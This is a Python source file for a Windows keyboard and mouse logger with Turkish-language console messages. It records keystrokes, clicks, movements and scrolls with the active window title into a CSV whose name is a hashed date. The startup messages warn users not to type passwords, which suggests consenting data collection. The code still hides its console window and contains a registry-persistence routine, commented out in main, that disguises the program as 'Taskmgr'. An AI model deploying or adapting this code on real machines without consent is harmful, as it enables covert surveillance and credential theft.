#!/usr/bin/env python
# -*- coding: utf-8 -*-
from winreg import OpenKey, SetValueEx, HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ
import keyboard            # for keyboard hooks. See docs https://github.com/boppreh/keyboard
import os                  # for handling paths and removing files (FTP mode)
import sys                 # for getting sys.argv
import win32event, \
       win32api, winerror  # for disallowing multiple instances
import win32console        # for getting the console window
import win32gui            # for getting window titles and hiding the console window
import ctypes              # for getting window titles, current keyboard layout and capslock state
import datetime            # for getting the current time and using timedelta
import hashlib             # for hashing the names of files
import pandas as pd 
from pynput import mouse
import asyncio
import time
# CONSTANTS
# this number of characters must be typed for the logger to write the line_buffer:
CHAR_LIMIT = 1

# - GLOBAL SCOPE VARIABLES start -
# general check
if len(sys.argv) == 1:
    sys.argv = [sys.argv[0], 'local']
mode = sys.argv[1]

line_buffer, window_name = '', ''
time_logged = datetime.datetime.now() - datetime.timedelta(seconds=1)
count, backspace_buffer_len = 0, 0
key_records=[]
mouse_records=[]

full_path = os.path.dirname(os.path.realpath(sys.argv[0]))
initial_language = "Turkish"
todays_date = datetime.datetime.now().strftime('%Y-%b-%d')
# md5 only for masking dates - it's easily crackable:
todays_date_hashed = hashlib.md5(bytes(todays_date, 'utf-8')).hexdigest()

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# - GLOBAL SCOPE VARIABLES end -

# Disallowing multiple instances
mutex = win32event.CreateMutex(None, 1, 'mutex_var_qpgy')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    print("Multiple instance not allowed")
    exit(0)


def get_capslock_state():
    # using the answer here https://stackoverflow.com/a/21160382
    import ctypes
    hll_dll = ctypes.WinDLL("User32.dll")
    vk = 0x14
    return True if hll_dll.GetKeyState(vk) == 1 else False


shift_on = False   # an assumption, GetKeyState doesn't work
capslock_on = get_capslock_state()


def update_upper_case():
    global capslock_on, shift_on
    if (capslock_on and not shift_on) or (not capslock_on and shift_on):
        res = True
    else:
        res = False
    return res

upper_case = update_upper_case()

def log_local():
    # Local mode
    global full_path, line_buffer, backspace_buffer_len, window_name, time_logged
    try:
        with open(os.path.join(full_path, todays_date_hashed + ".csv"), "a", encoding='utf-8') as fp:
            fp.write(f"{time_logged},{window_name},KEYPRESS,{line_buffer},,,,,,\n")
    except:
        # if there's a problem with a file size: rename the old one, and continue as normal
        counter = 0
        while os.path.exists(os.path.join(full_path, todays_date_hashed + "_" + str(counter) + ".csv")):
            counter += 1
        try:
            os.rename(os.path.join(full_path, todays_date_hashed + ".csv"),
                      os.path.join(full_path, todays_date_hashed + "_" + str(counter) + ".csv"))
            window_name = ''
            time_logged = datetime.datetime.now() - datetime.timedelta(seconds=1)
        except Exception as e:
            print(e)
    line_buffer, backspace_buffer_len = '', 0
    return True


def log_debug():
    # Debug mode
    global line_buffer, backspace_buffer_len
    print(line_buffer)
    line_buffer, backspace_buffer_len = '', 0
    return True


def log_it():
    global mode, line_buffer
    # line_buffer = '\n' + line_buffer + '\n'
    if mode == "local":
        log_local()
    elif mode == 'debug':
        log_debug()
    return True


current_file_path = os.path.realpath(sys.argv[0])


# Add to startup for persistence
def add_to_startup():
    key_val = r'Software\Microsoft\Windows\CurrentVersion\Run'
    key2change = OpenKey(HKEY_CURRENT_USER,
                         key_val, 0, KEY_ALL_ACCESS)
    sys_args = ' '.join([mode])
    reg_value_prefix, reg_value_postfix = '', ''
    reg_value = reg_value_prefix + '"' + current_file_path + '" ' + sys_args + reg_value_postfix
    try:
        SetValueEx(key2change, "Taskmgr", 0, REG_SZ, reg_value)
    except: pass


def hide():
    # Hide Console
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window, 0)
    return True


def key_callback(event):
    global line_buffer, window_name, time_logged, upper_case, capslock_on, shift_on, backspace_buffer_len

    if event.event_type == 'up':
        if event.name in ['shift', 'right shift']:  # SHIFT UP
            shift_on = False
            upper_case = update_upper_case()
        return True

    window_buffer, time_buffer = '', ''

    # 1. Detect the active window change - if so, LOG THE WINDOW NAME
    user32 = ctypes.WinDLL('user32', use_last_error=True)
    curr_window = user32.GetForegroundWindow()
    event_window_name = win32gui.GetWindowText(curr_window)
    if window_name != event_window_name:
        window_name = event_window_name                                               # set the new value

    # 2. if MINUTES_TO_LOG_TIME minutes has passed - LOG THE TIME
    now = datetime.datetime.now()
    if now - time_logged > datetime.timedelta(seconds=1):
        time_buffer = '[' + ('%02d:%02d:%02d' % (now.hour, now.minute,now.second)) + ']: '  # update the line_buffer
        time_logged = now                                                           # set the new value

    if time_buffer != "" or window_buffer != "":
        if line_buffer != "":
            log_it()                                    # log anything from old window / times
        #line_buffer = time_buffer + window_buffer       # value to begin with
        """ backspace_buffer_len = the number of symbols of line_buffer up until the last technical tag (including it) 
         - window name, time or key tags (<BACKSPACE>, etc.).
        len(line_buffer) - backspace_buffer_len = the number of symbols that we can safely backspace.
        we increment backspace_buffer_len variable only when we append technical stuff
        (time_buffer or window_buffer or <KEYS>): """
        backspace_buffer_len = len(line_buffer)

    key_pressed = ''

    # 3. DETERMINE THE KEY_PRESSED GIVEN THE EVENT
    if event.name in ['left', 'right']:  # arrow keys  # 'home', 'end', 'up', 'down'
        key_pressed_list = list()
        if keyboard.is_pressed('ctrl') or keyboard.is_pressed('right ctrl'):
            key_pressed_list.append('ctrl')
        if keyboard.is_pressed('shift') or keyboard.is_pressed('right shift'):
            key_pressed_list.append('shift')
        key_pressed = '<' + '+'.join(key_pressed_list) + ('+' if len(key_pressed_list) > 0 else '') + event.name + '>'
        line_buffer += key_pressed
        backspace_buffer_len = len(line_buffer)
    if event.name in ['ctrl', 'shift','alt']:
        key_pressed_list = list()
        if keyboard.is_pressed('ctrl') or keyboard.is_pressed('right ctrl'):
            key_pressed_list.append('ctrl')
        if keyboard.is_pressed('shift') or keyboard.is_pressed('right shift'):
            key_pressed_list.append('shift')
        if keyboard.is_pressed('alt') or keyboard.is_pressed('right alt'):
            key_pressed_list.append('alt')
        key_pressed = '<' + '+'.join(key_pressed_list) +  '>'
        print(key_pressed)
        line_buffer += key_pressed
        print(line_buffer)
        backspace_buffer_len = len(line_buffer)
    elif event.name == 'space':
        key_pressed = '<SPACE>'
    elif event.name in ['enter', 'tab']:
        key_pressed = '<TAB>' if event.name == 'tab' else '<ENTER>'
        line_buffer += key_pressed
        backspace_buffer_len = len(line_buffer)
        log_it()    # pass event to other handlers
        return True
    elif event.name == 'delete':
        key_pressed = '<DEL>'
        line_buffer += key_pressed
    elif event.name == 'esc':
        key_pressed = '<ESC>'
        line_buffer += key_pressed
    elif event.name == 'page up':
        key_pressed = '<PAGE UP>'
        line_buffer += key_pressed
    elif event.name == 'page down':
        key_pressed = '<PAGE DOWN>'
        line_buffer += key_pressed
    elif event.name == 'print screen':
        key_pressed = '<PRINT SCREEN>'
        line_buffer += key_pressed
    elif event.name == 'insert':
        key_pressed = '<INSERT>'
        line_buffer += key_pressed
    elif event.name == 'num lock':
        key_pressed = '<NUM LOCK>'
        line_buffer += key_pressed
    elif event.name == 'caps lock':
        key_pressed = '<CAPS LOCK>'
        line_buffer += key_pressed
    elif event.name == 'scroll lock':
        key_pressed = '<SCROLL LOCK>'
        line_buffer += key_pressed
    elif event.name == 'pause':
        key_pressed = '<PAUSE>'
        line_buffer += key_pressed
    elif event.name == 'backspace':
        if len(line_buffer) - backspace_buffer_len > 0:
            line_buffer = line_buffer[:-1]               # remove the last character
        else:
            line_buffer += '<BACKSPACE>'
            backspace_buffer_len = len(line_buffer)
    elif event.name == 'caps lock':                      # CAPS LOCK
        upper_case = not upper_case
        capslock_on = not capslock_on
    elif event.name in ['shift', 'right shift']:         # SHIFT DOWN
        shift_on = True
        upper_case = update_upper_case()
    else:
        key_pressed = event.name
        if len(key_pressed) == 1:
            key_pressed = key_pressed.upper() if upper_case else key_pressed.lower()
        else:
            # unknown character (eg arrow key, shift, ctrl, alt)
            return True  # pass event to other handlers
        line_buffer += key_pressed

    # 5. DECIDE ON WHETHER TO LOG CURRENT line_buffer OR NOT:
    if len(line_buffer) >= CHAR_LIMIT:
        log_it()
    return True  # pass event to other handlers


async def mouseEvents():
    global mouse_records, time_logged, window_name # Date_time | window_name | keyboard_input | mouse_input
    with mouse.Events() as events:
        #await asyncio.sleep(1)
        for event in events:
            # x ,y, button, pressed, dx,dy
            now = datetime.datetime.now()
            if event.__class__.__name__ == str("Click"):
                with open(os.path.join(full_path, todays_date_hashed + ".csv"), "a", encoding='utf-8') as fp:
                    fp.write(f"{now},{window_name},CLICK,,{str(event.x)},{str(event.y)},{str(event.button)},{str(event.pressed)},, \n")
            elif event.__class__.__name__ == str("Move"):
                with open(os.path.join(full_path, todays_date_hashed + ".csv"), "a", encoding='utf-8') as fp:
                    fp.write(f"{now},{window_name},MOVE,,{str(event.x)},{str(event.y)},,,, \n")
            elif event.__class__.__name__ == str("Scroll"):
                with open(os.path.join(full_path, todays_date_hashed + ".csv"), "a", encoding='utf-8') as fp:
                    fp.write(f"{now},{window_name},SCROLL,,{str(event.x)},{str(event.y)},,,{str(event.dx)},{str(event.dy)} \n")
            else:
                print('Unknown event {}'.format(event))
                mouse_records.append((time_logged,window_name, event))

async def worker():
    # add other functions here to run them concurrently
    keyboard.hook(key_callback)
    futures = [await mouseEvents(), keyboard.wait('ctrl+c') ]
    return await asyncio.gather(*futures)

async def worker_catch():
    try:
        return await worker()
    except (asyncio.CancelledError, KeyboardInterrupt):
        print(bcolors.FAIL+'Görev iptal edildi.\nÇıkış Yapılıyor...'+bcolors.ENDC)
    except Exception as ex:
        print('Exception:', ex)
    return None


if __name__ == '__main__':
    print(bcolors.OKBLUE+ "Yazılım başlatılıyor..."+ bcolors.ENDC)
    print(bcolors.FAIL+ "Bu programı kullanırken şifre gibi gizli bilgilerinizi girmeyiniz."+ bcolors.ENDC)
    print("Bu program "+ bcolors.OKGREEN+ os.path.join(full_path, todays_date_hashed  + '.csv'+ bcolors.ENDC) +" konumundaki yere\
        \nbelirtilen isimde bir dosya oluşturacaktır.")
    print(bcolors.BOLD+"yusuf.ozer@adu.edu.tr"+bcolors.ENDC + bcolors.OKBLUE+ " adresinden iletişime geçebilirsiniz."+ bcolors.ENDC)

    if not os.path.exists(os.path.join(full_path, todays_date_hashed + ".csv")):
        with open(os.path.join(full_path, todays_date_hashed + ".csv"), "a", encoding='utf-8') as fp:
            fp.write("DateTime,Window,EventType,Keystrokes,MouseX,MouseY,ButtonType,IsPressed,ScrollDX,ScrollDY\n")
    # Disallowing multiple instances
    mutex = win32event.CreateMutex(None, 1, 'mutex_var_qpgy_main')
    if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
        mutex = None
        print("Multiple instances are not allowed")
        exit(0)
    hide()
    #add_to_startup()
    task = None
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.set_debug(False)
    try:
        print(bcolors.WARNING+"Yazılım çalışıyor...\n"+"Bu yazılımı kapatmak için CTRL+C tuşlarına basınız."+bcolors.ENDC)
        task = asyncio.ensure_future(worker_catch())
        result = loop.run_until_complete(task)
        print('Result:', result)
    finally:
        task.cancel()
        task.exception()
        loop.stop()
        loop.close()
    
